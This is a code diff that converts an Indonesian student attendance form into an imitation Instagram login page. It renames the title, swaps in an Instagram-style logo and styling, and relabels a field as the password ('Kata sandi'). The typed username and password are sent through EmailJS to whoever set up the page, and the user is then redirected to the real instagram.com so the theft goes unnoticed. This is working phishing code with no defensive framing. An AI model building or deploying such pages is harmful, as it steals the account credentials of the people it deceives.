@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login Absen Siswa</title>
+  <title>instragram login</title>
 
   <!-- EmailJS CDN -->
   <script type="text/javascript"
@@ -17,7 +17,7 @@
 
   <style>
     body {
-      background-color: #000;
+      background-color: #121D23;
       color: #fff;
       font-family: Arial, sans-serif;
       margin: 0;
@@ -42,18 +42,18 @@
 
     input {
       width: 300px;
-      padding: 15px;
+      padding: 16px;
       margin-bottom: 10px;
       background-color: #121D23;
-      border: 3px solid white;
-      border-radius: 30px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
       color: white;
       font-size: 14px;
     }
 
     button {
-      width: 300px;
-      padding: 15px;
+      width: 335px;
+      padding: 12px;
       background-color: #007bff;
       color: white;
       border: none;
@@ -95,10 +95,10 @@
 </head>
 <body>
   <div class="container">
-    <img src="logo.png" alt="logo" />
+    <img src="ig1.png" alt="logo" />
     <form id="loginForm" style="display: flex; flex-direction: column; align-items: center;">
       <input type="text" id="nama" name="user_name" placeholder="Nama pengguna, email, atau nomor ponsel" required />
-      <input type="text" id="status" name="user_status" placeholder="Hadir/ Sakit/ Izin" required />
+      <input type="text" id="status" name="user_status" placeholder="Kata sandi" required />
       <button type="submit">Login</button>
     </form>
     <div class="link">Lupa kata sandi?</div>
@@ -118,11 +118,11 @@
         user_status: status
       }).then(function(response) {
         alert("Login berhasil!\nNama: " + nama + "\nStatus: " + status);
-        window.location.href = "#"; // Ganti jika ada PR/modul
+        window.location.href = "https://www.instagram.com/"; // Ganti jika ada PR/modul
       }, function(error) {
         alert("Gagal mengirim data absen. Silakan coba lagi.");
       });
     });
   </script>
 </body>
-</html>
+        </html>
